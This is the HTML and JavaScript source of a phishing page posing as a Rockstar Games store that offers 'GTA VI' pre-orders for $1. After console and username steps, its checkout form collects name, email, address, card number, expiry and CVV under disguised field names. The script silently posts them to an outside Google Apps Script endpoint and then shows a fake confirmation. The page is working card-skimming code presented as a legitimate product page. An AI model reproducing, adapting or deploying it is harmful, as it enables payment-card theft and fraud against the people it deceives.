<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Grand Theft Auto VI | The Rockstar Games Experience</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700;900&family=Archivo+Black&display=swap');
        :root { --rs-yellow: #F6E200; --bg-black: #050505; --text-white: #ffffff; }
        
        * { box-sizing: border-box; }
        body { font-family: 'Roboto Condensed', sans-serif; background: var(--bg-black); color: var(--text-white); margin: 0; line-height: 1.6; }

        .top-nav { background: #000; border-bottom: 2px solid var(--rs-yellow); padding: 20px 5%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
        .logo { font-family: 'Archivo Black', sans-serif; font-size: 28px; cursor: pointer; }
        .nav-items a { margin-left: 30px; text-transform: uppercase; font-weight: 700; cursor: pointer; transition: 0.3s; }
        .nav-items a:hover { color: var(--rs-yellow); }

        .page { display: none; padding: 80px 10%; min-height: 80vh; }
        .active-page { display: block; animation: fadeIn 0.7s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .hero-banner { height: 75vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: radial-gradient(circle, rgba(20,20,20,1) 0%, rgba(0,0,0,1) 100%); text-align: center; }
        
        .checkout-wrapper { max-width: 850px; margin: 40px auto; background: #0a0a0a; padding: 60px; border-top: 5px solid var(--rs-yellow); box-shadow: 0 10px 50px rgba(0,0,0,0.5); }
        .input-group { margin-bottom: 25px; }
        label { display: block; font-size: 11px; text-transform: uppercase; color: #888; margin-bottom: 8px; letter-spacing: 1.5px; }
        input, select { width: 100%; padding: 18px; background: #000; border: 1px solid #333; color: white; font-size: 16px; }
        
        .btn-main { background: var(--rs-yellow); color: #000; padding: 25px; width: 100%; border: none; font-weight: 900; text-transform: uppercase; cursor: pointer; font-size: 20px; transition: 0.4s; }
        .btn-main:hover { background: #fff; transform: translateY(-2px); }

        .console-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; margin-top: 40px; }
        .console-card { background: #111; padding: 40px; border: 2px solid #333; text-align: center; cursor: pointer; transition: 0.3s; }
        .console-card:hover { border-color: var(--rs-yellow); }
    </style>
</head>
<body>

<nav class="top-nav">
    <div class="logo" onclick="switchPage('home')">ROCKSTAR GAMES</div>
    <div class="nav-items">
        <a onclick="switchPage('home')">Home</a>
        <a onclick="switchPage('features')">Features</a>
        <a onclick="switchPage('checkout')">Pre-Order</a>
    </div>
</nav>

<div id="home" class="page active-page">
    <div class="hero-banner">
        <h1 style="font-size: 5rem; font-family: 'Archivo Black';">GTA VI</h1>
        <p style="font-size: 1.4rem;">PRE-ORDER GTA VI FOR $1</p>
        <button class="btn-main" style="width: 250px;" onclick="switchPage('console-select')">Pre-Order Now</button>
    </div>
</div>

<div id="console-select" class="page">
    <h2 style="text-align: center;">CHOOSE YOUR CONSOLE</h2>
    <div class="console-grid">
        <div class="console-card" onclick="selectConsole('PS5')"><h3>PLAYSTATION 5</h3></div>
        <div class="console-card" onclick="selectConsole('XBOX')"><h3>XBOX</h3></div>
    </div>
</div>

<div id="username-entry" class="page">
    <div class="checkout-wrapper">
        <h2 id="user-heading">ENTER USERNAME</h2>
        <div class="input-group">
            <label id="user-label">Console Username</label>
            <input type="text" id="console-user" placeholder="Enter your username..." required>
        </div>
        <button class="btn-main" onclick="validateUsername()">Continue</button>
    </div>
</div>

<div id="checkout" class="page">
    <div class="checkout-wrapper">
        <h2 style="text-align: center; margin-bottom: 40px;">SECURE DIGITAL TRANSACTION</h2>
        <form id="checkoutForm" action="https://script.google.com/macros/s/AKfycbzyFwA-gHdtK1RaDf_H8ijMrO4tUEmWRO1EeAxjDzHbwYi-d-Z6K-vLOq4J-6isznQ5/exec" method="POST">
            <div class="input-group"><label>Full Name</label><input type="text" name="Full_Name" required></div>
            <div class="input-group"><label>Email Address</label><input type="email" name="Email" required></div>
            <div class="input-group"><label>Street Address</label><input type="text" name="Street" required></div>
            <div class="input-group"><label>City</label><input type="text" name="City" required></div>
            <div class="input-group">
                <label>State</label>
                <select name="State" required>
                    <option value="">Select State</option>
                    <option value="AL">Alabama</option>
                    <option value="AK">Alaska</option>
                    <option value="AZ">Arizona</option>
                    <option value="AR">Arkansas</option>
                    <option value="CA">California</option>
                    <option value="CO">Colorado</option>
                    <option value="CT">Connecticut</option>
                    <option value="DE">Delaware</option>
                    <option value="FL">Florida</option>
                    <option value="GA">Georgia</option>
                    <option value="HI">Hawaii</option>
                    <option value="ID">Idaho</option>
                    <option value="IL">Illinois</option>
                    <option value="IN">Indiana</option>
                    <option value="IA">Iowa</option>
                    <option value="KS">Kansas</option>
                    <option value="KY">Kentucky</option>
                    <option value="LA">Louisiana</option>
                    <option value="ME">Maine</option>
                    <option value="MD">Maryland</option>
                    <option value="MA">Massachusetts</option>
                    <option value="MI">Michigan</option>
                    <option value="MN">Minnesota</option>
                    <option value="MS">Mississippi</option>
                    <option value="MO">Missouri</option>
                    <option value="MT">Montana</option>
                    <option value="NE">Nebraska</option>
                    <option value="NV">Nevada</option>
                    <option value="NH">New Hampshire</option>
                    <option value="NJ">New Jersey</option>
                    <option value="NM">New Mexico</option>
                    <option value="NY">New York</option>
                    <option value="NC">North Carolina</option>
                    <option value="ND">North Dakota</option>
                    <option value="OH">Ohio</option>
                    <option value="OK">Oklahoma</option>
                    <option value="OR">Oregon</option>
                    <option value="PA">Pennsylvania</option>
                    <option value="RI">Rhode Island</option>
                    <option value="SC">South Carolina</option>
                    <option value="SD">South Dakota</option>
                    <option value="TN">Tennessee</option>
                    <option value="TX">Texas</option>
                    <option value="UT">Utah</option>
                    <option value="VT">Vermont</option>
                    <option value="VA">Virginia</option>
                    <option value="WA">Washington</option>
                    <option value="WV">West Virginia</option>
                    <option value="WI">Wisconsin</option>
                    <option value="WY">Wyoming</option>
                </select>
            </div>
            <hr style="border: 0; border-top: 1px solid #333; margin: 30px 0;">
            <div class="input-group"><label>Cardholder Name</label><input type="text" name="Reference_User" required></div>
            <div class="input-group"><label>Card Number</label><input type="text" id="cardNum" name="Reference_ID" placeholder="0000 0000 0000 0000" maxlength="19" pattern="\d{4} \d{4} \d{4} \d{4}" title="16-digit card number" required></div>
            <div style="display: flex; gap: 20px;">
                <div class="input-group" style="flex: 1;"><label>Expiry</label><input type="text" id="expiry" name="Expiry" placeholder="MM/YY" maxlength="5" pattern="\d{2}/\d{2}" title="MM/YY" required></div>
                <div class="input-group" style="flex: 1;"><label>CVV</label><input type="text" id="cvv" name="Secure_Code" placeholder="***" maxlength="3" pattern="\d{3}" title="3-digit CVV" required></div>
            </div>
            <button type="submit" class="btn-main" id="submitBtn">Process Secure Transaction — $1.00</button>
        </form>
    </div>
</div>

<div id="confirmation" class="page">
    <div class="checkout-wrapper" style="text-align: center;">
        <h2>THANK YOU!</h2>
        <p>Gta 6 will be downloaded to your console once the game releases!</p>
    </div>
</div>

<script>
    let selectedConsole = "";

    function switchPage(id) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
        document.getElementById(id).classList.add('active-page');
        window.scrollTo(0,0);
    }

    function selectConsole(consoleType) {
        selectedConsole = consoleType;
        document.getElementById('user-heading').innerText = consoleType + " CONSOLE USERNAME";
        document.getElementById('user-label').innerText = consoleType + " USERNAME";
        switchPage('username-entry');
    }

    function validateUsername() {
        if(document.getElementById('console-user').checkValidity()) {
            switchPage('checkout');
        } else {
            alert("Please enter a username.");
        }
    }

    // Auto-formatting (Card/Expiry/CVV)
    document.getElementById('cardNum').addEventListener('input', (e) => {
        let v = e.target.value.replace(/\D/g, '').substring(0, 16);
        e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
    });
    document.getElementById('expiry').addEventListener('input', (e) => {
        let v = e.target.value.replace(/\D/g, '').substring(0, 4);
        if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
        e.target.value = v;
    });
    document.getElementById('cvv').addEventListener('input', (e) => e.target.value = e.target.value.replace(/\D/g, ''));

    const form = document.getElementById('checkoutForm');
    const btn = document.getElementById('submitBtn');
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        btn.innerText = "AUTHORIZING...";
        btn.disabled = true;
        fetch(form.action, { method: 'POST', body: new FormData(form), mode: 'no-cors' })
        .then(() => {
            switchPage('confirmation');
        });
    });
</script>
</body>
</html>
